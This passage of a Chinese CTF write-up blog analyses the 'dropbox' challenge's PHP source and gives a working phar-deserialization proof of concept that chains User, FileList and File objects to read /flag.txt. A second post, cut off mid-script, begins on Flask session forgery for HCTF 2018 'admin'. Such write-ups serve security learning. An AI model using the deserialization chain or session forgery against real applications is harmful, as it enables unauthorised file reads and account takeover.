class="comment">#离怀秋师傅指出这是打印出方法的结果</span></span></span><br><span class="line"><span class="php">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span></span><br><span class="line"><span class="php">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span></span><br><span class="line"><span class="php">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span></span><br><span class="line"><span class="php">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span></span><br><span class="line"><span class="php">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span></span><br><span class="line"><span class="php">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;涓嬭浇&lt;/a&gt; / &lt;a href="#" class="delete"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span>;</span></span><br><span class="line"><span class="php">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $table;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;	</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;filename = $filename;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">        $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        unlink(<span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;		<span class="comment">#包含文件</span></span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="delete-php"><a href="#delete-php" class="headerlink" title="delete.php"></a>delete.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: login.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span></span><br><span class="line"><span class="php">$file = <span class="keyword">new</span> File();</span></span><br><span class="line"><span class="php">$filename = (string) $_POST[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span></span><br><span class="line"><span class="php">    $file-&gt;detele();</span></span><br><span class="line"><span class="php">    Header(<span class="string">"Content-type: application/json"</span>);</span></span><br><span class="line"><span class="php">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> json_encode($response);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    Header(<span class="string">"Content-type: application/json"</span>);</span></span><br><span class="line"><span class="php">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> json_encode($response);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="upload-php"><a href="#upload-php" class="headerlink" title="upload.php"></a>upload.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: login.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>])) &#123;</span></span><br><span class="line"><span class="php">    $filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span></span><br><span class="line"><span class="php">    $pos = strrpos($filename, <span class="string">"."</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($pos !== <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">        $filename = substr($filename, <span class="number">0</span>, $pos);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $fileext = <span class="string">".gif"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">switch</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">case</span> <span class="string">'image/gif'</span>:</span></span><br><span class="line"><span class="php">            $fileext = <span class="string">".gif"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">case</span> <span class="string">'image/jpeg'</span>:</span></span><br><span class="line"><span class="php">            $fileext = <span class="string">".jpg"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">case</span> <span class="string">'image/png'</span>:</span></span><br><span class="line"><span class="php">            $fileext = <span class="string">".png"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">default</span>:</span></span><br><span class="line"><span class="php">            $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Only gif/jpg/png allowed"</span>);</span></span><br><span class="line"><span class="php">            Header(<span class="string">"Content-type: application/json"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> json_encode($response);</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; strlen($filename) !== <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="php">        $dst = $_SESSION[<span class="string">'sandbox'</span>] . $filename . $fileext;</span></span><br><span class="line"><span class="php">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dst);</span></span><br><span class="line"><span class="php">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span></span><br><span class="line"><span class="php">        Header(<span class="string">"Content-type: application/json"</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> json_encode($response);</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Invaild filename"</span>);</span></span><br><span class="line"><span class="php">        Header(<span class="string">"Content-type: application/json"</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> json_encode($response);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="download-php"><a href="#download-php" class="headerlink" title="download.php"></a>download.php</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span></span><br><span class="line"><span class="php">    header(<span class="string">"Location: login.php"</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span></span><br><span class="line"><span class="php">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span></span><br><span class="line"><span class="php">$file = <span class="keyword">new</span> File();</span></span><br><span class="line"><span class="php">$filename = (string) $_POST[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;			</span></span><br><span class="line"><span class="php">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span></span><br><span class="line"><span class="php">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $file-&gt;close();	<span class="comment">#除了flag文件不让读以外，任意文件读取并显示</span></span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>这道题没有unserialize()函数，所以用的是phar反序列化漏洞，</p>
<p>利用条件：</p>
<p>存在：<br>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数</p>
<p>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>离怀秋师傅的poc</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">public</span> $db;</span></span><br><span class="line"><span class="php">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> FileList;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">private</span> $files;</span></span><br><span class="line"><span class="php"><span class="keyword">private</span> $results;</span></span><br><span class="line"><span class="php"><span class="keyword">private</span> $funcs;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">	$file=<span class="keyword">new</span> File;</span></span><br><span class="line"><span class="php">	$file-&gt;filename=<span class="string">'/flag.txt'</span>;</span></span><br><span class="line"><span class="php">	<span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span></span><br><span class="line"><span class="php">	<span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">ini_set(<span class="string">'phar.readonly'</span>,<span class="number">0</span>);</span></span><br><span class="line"><span class="php">@unlink(<span class="string">"phar.phar"</span>);</span></span><br><span class="line"><span class="php">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span></span><br><span class="line"><span class="php">$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="php">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span></span><br><span class="line"><span class="php">$o = <span class="keyword">new</span> User();</span></span><br><span class="line"><span class="php">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span></span><br><span class="line"><span class="php">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span></span><br><span class="line"><span class="php"><span class="comment">//签名自动计算</span></span></span><br><span class="line"><span class="php">$phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="利用链："><a href="#利用链：" class="headerlink" title="利用链："></a>利用链：</h3><p>​        上传phar，然后删除时，delete.php处存在file类的open函数，open函数存在file_exists()方法，这样就可以触发我们phar的反序列化，然后我们phar中调用了User类，User类destruct的时候，调用了db.close方法，而这里的db是Filelist类的对象，所以调用了Filelist类的close()方法，但是Filelist又不存在这个方法，所以调用了call方法，使得元素file，也就是/flag.txt调用close方法，也就是包含这个文件。最后，Filelist类调用destruct方法，打印出函数执行结果，也就是根目录下flag.txt文件的内容。</p>
<p><img src="/2019/08/12/dropbox%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1565604935565.png" alt="1565604935565"></p>
<h3 id="疑惑点："><a href="#疑惑点：" class="headerlink" title="疑惑点："></a>疑惑点：</h3><p>为啥download.php不能利用，我觉得那个检查flag文件名的waf应该挡不出才对。</p>
<p><img src="/2019/08/12/dropbox%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1565604942764.png" alt="1565604942764"></p>
<h3 id="解惑："><a href="#解惑：" class="headerlink" title="解惑："></a>解惑：</h3><p>赵师傅指出了一个我之前忽略掉的东西，open_basedir</p>
<p>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”);</p>
<p>（用open_basedir指定的限制实际上是前缀,而不是目录名。）</p>
<p>所以download.php只能访问限定的文件夹（因为没有/结尾，所以可以访问限定文件夹的子文件夹）</p>
<p>而flag是在根目录下，所以无法访问。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/12/dropbox代码审计/" data-id="ck2g3l2is000plgv3ceulu5d6" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/note/">note</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-admin_ssrfme_piapia_ikun" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/08/09/admin_ssrfme_piapia_ikun/" class="article-date">
  <time datetime="2019-08-09T07:04:55.000Z" itemprop="datePublished">2019-08-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/08/09/admin_ssrfme_piapia_ikun/">admin_ssrfme_piapia_ikun</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="admin-ssrfme-piapia-ikun"><a href="#admin-ssrfme-piapia-ikun" class="headerlink" title="admin_ssrfme_piapia_ikun"></a>admin_ssrfme_piapia_ikun</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以后buuoj的题都在这里更新好了。。。</p>
<h3 id="admin-（信息搜集，unicode欺骗，代码审计）"><a href="#admin-（信息搜集，unicode欺骗，代码审计）" class="headerlink" title="admin    （信息搜集，unicode欺骗，代码审计）"></a>admin    （信息搜集，unicode欺骗，代码审计）</h3><p>wp参考：<a href="https://www.anquanke.com/post/id/164086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164086</a></p>
<p>拿到题目</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//admin.2018.hctf.io/</span></span><br></pre></td></tr></table></figure>

<p>f12查看源代码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现提示要成为admin</p>
<p>随便注册个账号，登入后，在</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-<span class="string">source:</span><span class="string">http:</span><span class="comment">//admin.2018.hctf.io/change</span></span><br></pre></td></tr></table></figure>

<p>发现提示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure>

<p>于是下载源码</p>
<p>拿到代码后，简单的查看了下路由</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@app</span>.route(<span class="string">'/index'</span>)</span><br><span class="line">def index():</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/register'</span>, methods = [<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def register():</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/login'</span>, methods = [<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def login():</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/logout'</span>)</span><br><span class="line">def logout():</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/change'</span>, methods = [<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def change():</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/edit'</span>, methods = [<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def edit():</span><br></pre></td></tr></table></figure>

<p>查看一下路由，功能非常单一：登录，改密码，退出，注册，edit。</p>
<p>但edit功能也是个假功能，并且发现并不会存在sql注入之类的问题，也没有文件写入或者是一些危险的函数，此时陷入了困境。</p>
<h4 id="解法一：session伪造"><a href="#解法一：session伪造" class="headerlink" title="解法一：session伪造"></a>解法一：session伪造</h4><p>想到的第一个方法：session伪造</p>
<p>于是尝试伪造session，根据ph写的文章</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.leavesongs.com<span class="regexp">/PENETRATION/</span>client-session-security.html</span><br></pre></td></tr></table></figure>

<p>可以知道flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p>
<p>所以我们构造脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> 